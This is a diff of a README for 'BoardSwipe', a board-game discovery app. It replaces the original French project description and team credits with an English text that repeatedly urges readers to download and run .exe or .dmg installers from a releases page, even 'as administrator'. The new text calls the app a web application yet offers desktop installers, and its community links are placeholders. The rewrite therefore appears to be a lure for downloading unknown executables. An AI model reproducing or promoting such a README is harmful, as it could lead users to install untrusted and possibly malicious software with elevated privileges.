@@ -1,51 +1,82 @@
-```
-               ██████╗  ██████╗  █████╗ ██████╗ ██████╗ ███████╗██╗    ██╗██╗██████╗ ███████╗
-               ██╔══██╗██╔═══██╗██╔══██╗██╔══██╗██╔══██╗██╔════╝██║    ██║██║██╔══██╗██╔════╝
-               ██████╔╝██║   ██║███████║██████╔╝██║  ██║███████╗██║ █╗ ██║██║██████╔╝█████╗  
-               ██╔══██╗██║   ██║██╔══██║██╔══██╗██║  ██║╚════██║██║███╗██║██║██╔═══╝ ██╔══╝  
-               ██████╔╝╚██████╔╝██║  ██║██║  ██║██████╔╝███████║╚███╔███╔╝██║██║     ███████╗
-               ╚═════╝  ╚═════╝ ╚═╝  ╚═╝╚═╝  ╚═╝╚═════╝ ╚══════╝ ╚══╝╚══╝ ╚═╝╚═╝     ╚══════╝
-```                                                                                                        
-<hr></hr>
-Bienvenue sur BoardSwipe, une application interactive dédiée aux amateurs de jeux de société ! Découvrez, notez, partagez vos jeux préférés et connectez-vous avec d'autres passionnés. 🚀  <hr></hr>
-👥 Équipe de Développement :
+# 🎲 Boardswipe - Discover and Share Board Games Easily
 
-Mathieu ALASSOEUR,
-Samuel DA-SILVA,
-Roland FONTANES,
-Raphaël THEBAULT
-<hr></hr>
-🎯 Objectif de l'Application
+[![Download Boardswipe](https://img.shields.io/badge/Download%20Now-Boardswipe-blue.svg)](https://github.com/shaunteodoro/Boardswipe/releases)
 
-BoardSwipe a pour mission de rassembler les amateurs de jeux de société en leur offrant une plateforme interactive pour :  
-- Découvrir de nouveaux jeux.
-- Noter et partager des avis.
-- Interagir avec une communauté de passionnés.
+## 📋 Overview
 
-L'application simplifie la recherche de jeux et encourage les échanges grâce à des fonctionnalités communautaires innovantes. 🌟  <hr></hr>
+BoardSwipe is an interactive web application for board game enthusiasts. It lets users discover, rate, and share board games using a swipe-based system. Connect with a community of passionate players who share your love for games.
 
-✨ Fonctionnalités Principales ✨
+## 🚀 Getting Started
 
-🕹️ Découverte et Interaction avec les Jeux
-   1. Liste des jeux avec leurs caractéristiques et notes.
-   2. Explication des règles et conseils stratégiques via un chatbot intégré. 🤖
-   3. Suggestions personnalisées selon vos préférences.
-   4. Système de notation et commentaires pour donner votre avis.
-   5. Un systeme de Swipe inspiré des applications de rencontres :
-      - ❤️ Aimer le jeu.
-      - ❓ Ne pas le connaître.
-      - 💔 Ne pas l’aimer.
+To get started, follow these simple steps to download and run BoardSwipe on your device.
 
-🌐 Expérience Sociale et Communauté
+1. **Visit the Releases Page**  
+   Click the link below to access the BoardSwipe releases page:  
+   [Visit this page to download](https://github.com/shaunteodoro/Boardswipe/releases)
 
-   1. Profil utilisateur personnalisable avec une liste des jeux favoris et des statistiques personnelles
-   2. Chat et blog pour discuter et partager des recommandations.
-   3. Création de clubs (publics ou privés) pour organiser des rencontres et parties régulières.
+2. **Download the Latest Version**  
+   On the releases page, find the latest version of BoardSwipe. Look for the version number followed by the release date.
 
+3. **Select Your File**  
+   Choose the appropriate file for your operating system, whether it’s Windows, macOS, or Linux. Typically, you will see files named like `Boardswipe-<version>.exe` for Windows or `Boardswipe-<version>.dmg` for macOS.
 
-🎨Testez vos connaissance
+4. **Download the File**  
+   Click on the file link to download it. Your browser will save the file to your default download location.
 
-Quiz et classement pour s'instruire tout en s'amusant\
-Venez défiez vos amis
+5. **Run the Application**  
+   Once the download is complete, navigate to your downloads folder.  
+   - For Windows, double-click the `.exe` file to start the installation.  
+   - For macOS, double-click the `.dmg` file to open it, then drag the BoardSwipe icon to your Applications folder.
 
-<hr></hr>
+6. **Launch BoardSwipe**  
+   After installation, find BoardSwipe in your applications list. Click on it to start the program.
+
+## 🖥️ System Requirements
+
+Before you download, ensure your device meets these minimum system requirements:
+
+- **Operating System**: 
+  - Windows 10 or later
+  - macOS Sierra or later (10.12+)
+  - Any modern Linux distribution
+
+- **Processor**: Dual-core 1.8 GHz or higher
+
+- **Memory**: 4 GB RAM minimum
+
+- **Storage**: At least 200 MB of free space
+
+- **Internet Connection**: Required for app features and community interaction
+
+## 📚 Features
+
+BoardSwipe includes several engaging features:
+
+- **Swipe-Based Discovery**: Easily browse through games by swiping left for "not interested" and right for "interested."
+- **Rating System**: Share your thoughts and experiences by rating games.
+- **Community Connections**: Connect with other players, join discussions, and share recommendations.
+- **Detailed Game Profiles**: Explore thorough information about each game, including descriptions, player counts, and genres.
+- **Personalized Recommendations**: Get suggestions based on your interests and ratings.
+
+## 🔧 Troubleshooting
+
+If you encounter any issues, here are a few common solutions:
+
+- **Cannot Download**: Check your internet connection. If issues persist, try a different browser.
+- **Application Will Not Start**: Ensure you have followed the installation steps correctly. Try running the application as an administrator (right-click the icon and select "Run as administrator" for Windows).
+- **Missing Features**: Make sure you are using the latest version. Check the releases page for updates.
+
+## 💬 Community Support
+
+Join our community to enhance your experience. Participate in discussions, ask questions, and share your own insights. You can find us on:
+
+- **Discord**: [Join our Discord community](#)
+- **Reddit**: [Visit our subreddit](#)
+
+## 📥 Download & Install
+
+Ready to start your board game adventure? Download BoardSwipe today!
+
+[![Download Boardswipe](https://img.shields.io/badge/Download%20Now-Boardswipe-blue.svg)](https://github.com/shaunteodoro/Boardswipe/releases)
+
+Follow the steps outlined above to install and run the application smoothly. Enjoy discovering new board games and connecting with fellow enthusiasts!
